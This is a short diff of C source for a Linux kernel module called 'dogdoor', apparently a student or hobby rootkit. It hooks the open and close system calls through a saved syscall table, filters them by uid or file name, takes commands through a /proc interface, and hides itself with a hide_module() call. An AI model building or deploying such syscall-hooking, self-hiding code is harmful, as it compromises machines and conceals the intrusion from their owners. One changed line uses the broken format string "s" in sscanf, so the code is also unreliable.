@@ -19,7 +19,7 @@ int index=0;
 void ** sctable ;
 int connect = 1;
 int uid=-31;
-char inName[512];
+char inName[512] = "-1";
 char filepath[10][512];
 int top =0;
 
@@ -42,8 +42,11 @@ asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t
 	return orig_sys_open(filename, flags, mode) ;
 }
 
-asmlinkage int dogdoor_sys_close(char *fname, int flags, int mode)
-{	printk("dogdoor sys close implemented");
+asmlinkage int dogdoor_sys_close(char *filename, int flags, int mode)
+{	char fname[512] = "-1" ;
+	copy_from_user(fname, filename,512) ;	
+
+	printk("dogdoor sys close implemented");
 	//copy from kernel to user
 	//copy_from_user(pID, proID, 256);
 
@@ -52,7 +55,7 @@ asmlinkage int dogdoor_sys_close(char *fname, int flags, int mode)
 		return -1;
 	}
 	else{
-	return orig_sys_close(fname,flags,mode) ;
+	return orig_sys_close(filename,flags,mode) ;
 	}
 }
 
@@ -147,7 +150,7 @@ ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, size_t si
 	}
 	else if(index==3){
 		printk("index completed");
-		sscanf(buf+1, "%d",&inName);
+		sscanf(buf+1, "s",inName);
 	}	
 	if(index==5){
 		hide_module();
